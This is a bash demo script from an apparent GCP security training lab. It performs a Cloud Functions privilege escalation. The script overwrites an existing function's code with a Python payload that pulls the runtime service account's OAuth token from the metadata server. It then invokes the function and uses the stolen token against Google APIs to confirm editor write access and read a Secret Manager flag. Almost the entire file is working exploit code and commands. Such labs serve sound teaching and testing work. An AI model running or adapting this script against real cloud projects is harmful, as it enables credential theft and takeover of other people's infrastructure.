#!/bin/bash

# Demo script for gcp-cloudfunctions-002-cloudfunctions-functionsupdate
#
# Attack: starting_sa holds cloudfunctions.functions.update +
# cloudfunctions.functions.sourceCodeSet + run.routes.invoke at the project
# level (via a minimal custom role), AND iam.serviceAccounts.actAs on
# target_sa (via roles/iam.serviceAccountUser).
#
# The victim function is already deployed by Terraform, running AS target_sa
# (roles/editor), with a benign hello-world handler. The attacker uses the
# raw Cloud Functions v2 REST API (not gcloud) to replace the source code with
# a token-exfiltration payload while keeping target_sa as the runtime SA.
# Invoking the updated function returns target_sa's OAuth token from the
# metadata server, which is then used directly against Google REST APIs to
# prove editor-level access and read the CTF flag.
#
# Why raw API instead of gcloud functions deploy: gcloud makes an extra
# preflight call to Cloud Build's GetDefaultServiceAccount endpoint
# (cloudbuild.v1.projects.locations.getDefaultServiceAccount), which
# starting_sa is not granted. The raw PATCH API skips this gcloud-specific
# step and succeeds with only cloudfunctions.functions.update + sourceCodeSet +
# iam.serviceAccounts.actAs — the true minimal permission set.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   The exploit uses gcloud auth print-access-token to mint a bearer token for
#   starting_sa, then calls the Cloud Functions REST API directly as that SA.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-CLOUDFUNCTIONS-002: Cloud Function Code Update Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/.build"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_cloudfunctions_002_cloudfunctions_functionsupdate.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"      | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"       | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"       | jq -r '.deployer_email')
REGION=$(echo "$MODULE_OUTPUT"               | jq -r '.region')
VICTIM_FUNCTION_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.victim_function_name')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)
RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGION VICTIM_FUNCTION_NAME RESOURCE_SUFFIX; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (no project role):     $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor, on fn): $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):            $DEPLOYER_EMAIL"
echo "Region:                            $REGION"
echo "Victim function:                   $VICTIM_FUNCTION_NAME"
echo "Project:                           $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if our current gcloud CLI identity differs from the deployer that
# terraform provisioned. Terraform's ADC-derived deployer identity and the
# gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with a permission
# error, so stop now with actionable remediation instead of failing deep into
# the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

ENTRY_POINT="exfiltrate_token"

# Step 2: Verify starting SA has no project role of its own
echo -e "${YELLOW}Step 2: Confirming starting SA has no project-level privilege${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

# Step 3: [OBSERVE] Inspect the existing victim function to confirm it is
# already running as target_sa. This is the key narrative element: the function
# looks innocent (hello-world handler) but runs as a privileged identity.
# The attacker does not need to change the service account — it is already there.
echo -e "${YELLOW}Step 3: Observing the existing victim function${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud functions describe $VICTIM_FUNCTION_NAME --gen2 --region=$REGION --impersonate-service-account=$STARTING_SA_EMAIL"

FUNCTION_SA=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
    --gen2 \
    --region="$REGION" \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --format="value(serviceConfig.serviceAccountEmail)" 2>/dev/null || true)

if [ -z "$FUNCTION_SA" ]; then
    echo -e "${RED}✗ Could not describe the victim function — check that starting_sa holds${NC}"
    echo -e "${RED}  cloudfunctions.functions.get at the project level${NC}"
    exit 1
fi

echo ""
echo -e "  Function service account: ${CYAN}$FUNCTION_SA${NC}"
if [ "$FUNCTION_SA" = "$TARGET_SA_EMAIL" ]; then
    echo -e "${GREEN}✓ Confirmed: the victim function runs as target_sa ($TARGET_SA_EMAIL)${NC}"
    echo "  The function has an existing privileged identity — we only need to swap its code."
else
    echo -e "${YELLOW}Note: function SA is $FUNCTION_SA (expected $TARGET_SA_EMAIL)${NC}"
fi
echo ""

# Step 4: [SETUP] Build the malicious Cloud Function source package locally.
# No GCP calls happen here. The function's HTTP handler queries the local
# metadata server for the default service account's OAuth token — which is
# target_sa's token, because Terraform already set the function's SA to
# target_sa — and returns it verbatim in the HTTP response body.
echo -e "${YELLOW}Step 4: Building malicious Cloud Function source package${NC}"
rm -rf "$BUILD_DIR"
mkdir -p "$BUILD_DIR/src"

cat > "$BUILD_DIR/src/main.py" <<'PYEOF'
import json
import urllib.request

# Cloud Functions (2nd gen) HTTP entry point.
#
# This function does not use its caller's identity at all — it queries the
# GCE/Cloud Run metadata server that is local to its own execution
# environment. That metadata server always answers with credentials for
# whatever service account the function itself is *running as*
# (--service-account at deploy time), regardless of who invoked it.
#
# In this scenario the service account was set by Terraform, not by the
# attacker. The attacker only changed the code. This handler itself needs
# no actAs grant — it queries the local metadata server directly. actAs
# was required to *update* the function via the Cloud Functions v2 PATCH API.
def exfiltrate_token(request):
    metadata_url = (
        "http://metadata.google.internal/computeMetadata/v1/"
        "instance/service-accounts/default/token"
    )
    req = urllib.request.Request(
        metadata_url, headers={"Metadata-Flavor": "Google"}
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        token_data = json.loads(response.read())

    return (json.dumps(token_data), 200, {"Content-Type": "application/json"})
PYEOF

cat > "$BUILD_DIR/src/requirements.txt" <<'REQEOF'
functions-framework==3.*
REQEOF

echo -e "${GREEN}✓ Built malicious function source (entry point: $ENTRY_POINT)${NC}\n"

# Step 5: [EXPLOIT] Replace the existing function's code via the raw Cloud
# Functions v2 REST API. starting_sa holds cloudfunctions.functions.update +
# cloudfunctions.functions.sourceCodeSet on the project and actAs on target_sa.
#
# The raw API is used instead of gcloud because gcloud functions deploy makes
# an extra preflight call to Cloud Build's GetDefaultServiceAccount endpoint
# that starting_sa is not granted. The raw PATCH API succeeds with only
# cloudfunctions.functions.update + sourceCodeSet + actAs — the true minimal
# permission set without gcloud-specific mechanic grants.
#
# Sub-steps: (a) generateUploadUrl to get a signed GCS URL, (b) PUT the zip
# to that URL, (c) PATCH the function's buildConfig to point at the new source.
echo -e "${YELLOW}Step 5: [EXPLOIT] Updating victim function code via Cloud Functions v2 REST API${NC}"

# (a) Mint a bearer token for starting_sa and get a signed upload URL
ACCESS_TOKEN=$(gcloud auth print-access-token \
    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
if [ -z "$ACCESS_TOKEN" ]; then
    echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
    exit 1
fi

show_attack_cmd "$STARTING_SA_EMAIL" \
    "curl -X POST https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions:generateUploadUrl (cloudfunctions.functions.sourceCodeSet)"

UPLOAD_RESPONSE=$(curl -s -X POST \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}' \
    "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions:generateUploadUrl")
UPLOAD_URL=$(echo "$UPLOAD_RESPONSE" | jq -r '.uploadUrl // empty')
UPLOAD_BUCKET=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.bucket // empty')
UPLOAD_OBJ=$(echo "$UPLOAD_RESPONSE" | jq -r '.storageSource.object // empty')

if [ -z "$UPLOAD_URL" ] || [ -z "$UPLOAD_BUCKET" ]; then
    echo -e "${RED}✗ generateUploadUrl failed${NC}"
    echo "Response: $UPLOAD_RESPONSE"
    echo "Check that starting_sa holds cloudfunctions.functions.sourceCodeSet"
    exit 1
fi

# (b) Zip the malicious source and PUT it to the signed URL
(cd "$BUILD_DIR/src" && zip -qr "$BUILD_DIR/src.zip" .)
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    -H "Content-Type: application/zip" \
    --data-binary "@$BUILD_DIR/src.zip" \
    "$UPLOAD_URL")
if [ "$HTTP_CODE" != "200" ]; then
    echo -e "${RED}✗ Source upload failed (HTTP $HTTP_CODE)${NC}"
    exit 1
fi

# (c) PATCH the function: update entryPoint and source, keep all else (SA, trigger, etc.)
show_attack_cmd "$STARTING_SA_EMAIL" \
    "curl -X PATCH https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME?updateMask=buildConfig.source,buildConfig.entryPoint (cloudfunctions.functions.update + iam.serviceAccounts.actAs)"

PATCH_RESPONSE=$(curl -s -X PATCH \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions/${VICTIM_FUNCTION_NAME}?updateMask=buildConfig.source,buildConfig.entryPoint" \
    -d "{
      \"buildConfig\": {
        \"entryPoint\": \"${ENTRY_POINT}\",
        \"source\": {
          \"storageSource\": {
            \"bucket\": \"${UPLOAD_BUCKET}\",
            \"object\": \"${UPLOAD_OBJ}\"
          }
        }
      }
    }")

OPERATION_NAME=$(echo "$PATCH_RESPONSE" | jq -r '.name // empty')
PATCH_ERROR=$(echo "$PATCH_RESPONSE" | jq -r '.error // empty')
if [ -z "$OPERATION_NAME" ] || [ -n "$PATCH_ERROR" ]; then
    echo -e "${RED}✗ PATCH failed${NC}"
    echo "Response: $PATCH_RESPONSE"
    echo "Check that starting_sa holds cloudfunctions.functions.update and iam.serviceAccounts.actAs on target_sa"
    exit 1
fi

# Poll until ACTIVE (Cloud Build compiles and deploys the new code)
echo "Waiting for function update to complete..."
for i in $(seq 1 20); do
    sleep 10
    FUNC_STATE=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
        --gen2 --region="$REGION" --project="$PROJECT_ID" \
        --format="value(state)" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    FUNC_ENTRY=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
        --gen2 --region="$REGION" --project="$PROJECT_ID" \
        --format="value(buildConfig.entryPoint)" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    if [ "$FUNC_STATE" = "ACTIVE" ] && [ "$FUNC_ENTRY" = "$ENTRY_POINT" ]; then
        break
    fi
    if [ "$i" -eq 20 ]; then
        echo -e "${RED}✗ Function did not become ACTIVE after 200s (state: $FUNC_STATE, entryPoint: $FUNC_ENTRY)${NC}"
        exit 1
    fi
done

echo -e "${GREEN}✓ Updated $VICTIM_FUNCTION_NAME with exfiltration payload (SA unchanged: $TARGET_SA_EMAIL)${NC}\n"

# Step 6: [EXPLOIT] Invoke the updated function as starting_sa. The function
# now runs our payload code, so calling it returns target_sa's OAuth token from
# the metadata server. --no-allow-unauthenticated means the function requires
# an authenticated caller. We mint an OIDC identity token scoped to the
# function's Cloud Run URL as audience, then send it as a Bearer token via
# curl. This avoids `gcloud functions call`, which crashes for gen2 HTTP-
# triggered functions when combined with SA impersonation (known gcloud bug:
# it mishandles the impersonated OIDC token against the Cloud Run endpoint).
echo -e "${YELLOW}Step 6: [EXPLOIT] Invoking the updated function to steal target_sa's token${NC}"

FUNCTION_URL=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
    --gen2 \
    --region="$REGION" \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --format="value(serviceConfig.uri)" 2>/dev/null)

if [ -z "$FUNCTION_URL" ]; then
    echo -e "${RED}✗ Could not retrieve function invocation URL${NC}"
    echo "Check that starting_sa holds cloudfunctions.functions.get at the project level"
    exit 1
fi

show_attack_cmd "$STARTING_SA_EMAIL" \
    "ID_TOKEN=\$(gcloud auth print-identity-token --impersonate-service-account=$STARTING_SA_EMAIL --audiences=$FUNCTION_URL); curl -H 'Authorization: Bearer \$ID_TOKEN' $FUNCTION_URL"

ID_TOKEN=$(gcloud auth print-identity-token \
    --impersonate-service-account="$STARTING_SA_EMAIL" \
    --audiences="$FUNCTION_URL" 2>/dev/null)

if [ -z "$ID_TOKEN" ]; then
    echo -e "${RED}✗ Failed to mint identity token for $STARTING_SA_EMAIL${NC}"
    exit 1
fi

FUNCTION_BODY=$(curl -sS -H "Authorization: Bearer $ID_TOKEN" "$FUNCTION_URL" 2>/dev/null)

if [ -z "$FUNCTION_BODY" ]; then
    echo -e "${RED}✗ Failed to invoke function or empty response${NC}"
    echo "Check that starting_sa holds run.routes.invoke at the project level"
    exit 1
fi

EXFILTRATED_TOKEN=$(echo "$FUNCTION_BODY" | jq -r '.access_token // empty')
if [ -z "$EXFILTRATED_TOKEN" ]; then
    echo -e "${RED}✗ Function response did not contain an access_token${NC}"
    echo "Response: $FUNCTION_BODY"
    exit 1
fi
echo -e "${GREEN}✓ Exfiltrated an OAuth access token belonging to target_sa's runtime identity${NC}\n"

# Step 7: [EXPLOIT] Verify the exfiltrated token actually belongs to target_sa,
# using the raw bearer token directly against Google's tokeninfo endpoint —
# not gcloud impersonation. This is the proof that the metadata-server theft
# worked, independent of any gcloud identity on this machine.
echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying stolen token identity via raw bearer token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s 'https://oauth2.googleapis.com/tokeninfo?access_token=<redacted>'"

TOKEN_INFO=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${EXFILTRATED_TOKEN}")
TOKEN_EMAIL=$(echo "$TOKEN_INFO" | jq -r '.email // empty')

if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
    echo -e "${RED}✗ Exfiltrated token does not belong to target SA (got: ${TOKEN_EMAIL:-none})${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"

# Step 8: [EXPLOIT] Confirm editor-level write access using the raw stolen
# token (project label write/remove round-trip) — not gcloud impersonation.
echo -e "${YELLOW}Step 8: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -X PATCH 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID?updateMask=labels' -H 'Authorization: Bearer <redacted>' -d '{\"labels\": {...}}'"

CURRENT_PROJECT_JSON=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
CURRENT_LABELS=$(echo "$CURRENT_PROJECT_JSON" | jq -c '.labels // {}')
UPDATED_LABELS=$(echo "$CURRENT_LABELS" | jq -c '. + {"pl-privesc-verified": "true"}')

PATCH_RESPONSE=$(curl -s -X PATCH \
    -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"labels\": ${UPDATED_LABELS}}" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels")

if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
    curl -s -X PATCH \
        -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
        -H "Content-Type: application/json" \
        -d "{\"labels\": ${CURRENT_LABELS}}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels" > /dev/null 2>&1 || true
else
    echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
fi
echo ""

# Step 9: [THE ATTACK] Read the CTF flag directly via the Secret Manager REST
# API using the raw stolen bearer token — never re-impersonating via gcloud.
# This is the concrete proof that the exfiltrated token is usable credential
# material, not just a demonstration of IAM permissions.
echo -e "${YELLOW}Step 9: [EXPLOIT] Reading the CTF flag with the raw stolen token${NC}"
show_attack_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s -H 'Authorization: Bearer <redacted>' 'https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets/$FLAG_SECRET_ID/versions/latest:access'"

SECRET_RESPONSE=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")

ENCODED_PAYLOAD=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
if [ -z "$ENCODED_PAYLOAD" ]; then
    echo -e "${RED}✗ Failed to read flag via exfiltrated token${NC}"
    echo "Response: $SECRET_RESPONSE"
    exit 1
fi

# base64 decode via openssl for cross-platform (macOS BSD base64 only accepts
# -D, GNU base64 only accepts -d/--decode; openssl's base64 -d is consistent
# on both).
FLAG_VALUE=$(echo "$ENCODED_PAYLOAD" | openssl base64 -d -A)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}✗ Failed to decode flag payload${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Read Secret Manager secret using target_sa's exfiltrated token${NC}\n"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which used its"
echo "   cloudfunctions.functions.update + iam.serviceAccounts.actAs grants to"
echo "   overwrite the code of an existing function already running as $TARGET_SA_EMAIL,"
echo "   invoked it to steal target_sa's OAuth token from the metadata server, and"
echo "   used that raw token to read the CTF flag via Secret Manager REST API"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (cloudfunctions.functions.update + .sourceCodeSet + iam.serviceAccounts.actAs — THE VULNERABILITY)"
echo "    -> updated code inside '$VICTIM_FUNCTION_NAME' (SA unchanged: $TARGET_SA_EMAIL)"
echo "    -> exfiltrated OAuth access token (via metadata server)"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$SCRIPT_DIR/.demo_active"
